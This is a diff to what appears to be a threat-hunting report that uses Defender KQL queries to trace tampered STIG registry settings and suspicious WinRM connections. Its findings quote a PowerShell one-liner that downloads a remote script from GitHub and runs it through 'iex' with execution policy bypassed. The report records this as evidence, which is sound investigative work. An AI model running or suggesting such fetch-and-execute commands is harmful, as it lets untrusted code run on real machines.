@@ -58,7 +58,8 @@ DeviceRegistryEvents
          InitiatingProcessFileName
 | order by Timestamp desc
 ```
-Findings: All ten non-compliant values appeared between 2025-06-17 18:03–18:05 UTC.
+Findings: 
+- All ten non-compliant values appeared between 2025-06-17 18:03–18:05 UTC.
 
 ##
 
@@ -75,7 +76,7 @@ DeviceProcessEvents
 ```
 
 Findings:
-Process owner corp\backupsvc executed one-liner PowerShell:
+- Process owner corp\backupsvc executed one-liner PowerShell:
 ```
 powershell.exe -ep Bypass -NoProfile -c "iwr https://raw.githubusercontent.../stig-pre-staging-iocs.ps1 | iex"
 ```
@@ -95,6 +96,12 @@ DeviceNetworkEvents
 | project Timestamp, RemoteIP, RemotePort, InitiatingProcessFileName
 | order by Timestamp desc
 ```
+
+Findings: 
+- Multiple WinRM connections to 10.0.0.15:5985 initiated by powershell.exe
+- No SMB traffic detected yet (likely pending lateral movement phase)
+
+##
 
 ### 4. Validation - Confirmed All 10 STIG Controls Modified
 Validated that all 10 controls were modified by same account:
